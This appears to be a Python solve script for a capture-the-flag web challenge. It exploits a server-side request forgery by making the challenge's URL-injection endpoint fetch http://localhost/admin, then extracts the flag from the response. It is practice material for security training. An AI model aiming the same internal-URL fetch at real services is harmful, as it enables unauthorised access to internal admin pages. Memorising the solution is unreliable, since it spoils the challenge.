#!/usr/bin/env python3
import json
import re
import sys
import urllib.parse
import urllib.request

BASE = "https://brainrot-injector.sillyctf.psuccso.org/api/inject?url="
TARGET = "http://localhost/admin"


def fetch(url: str, timeout: int = 15) -> dict:
    full = BASE + urllib.parse.quote(url, safe="")
    with urllib.request.urlopen(full, timeout=timeout) as resp:
        raw = resp.read().decode("utf-8", errors="replace")
    return json.loads(raw)


def extract_flag(text: str) -> str | None:
    m = re.search(r"sillyCTF\{[^}]+\}", text)
    return m.group(0) if m else None


def main() -> int:
    data = fetch(TARGET)
    if not data.get("success"):
        print("Exploit failed: success=false", file=sys.stderr)
        print(json.dumps(data, ensure_ascii=False, indent=2), file=sys.stderr)
        return 1

    preview = data.get("preview", "")
    flag = extract_flag(preview)
    if not flag:
        print("Flag not found in preview", file=sys.stderr)
        print(preview)
        return 2

    print(flag)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
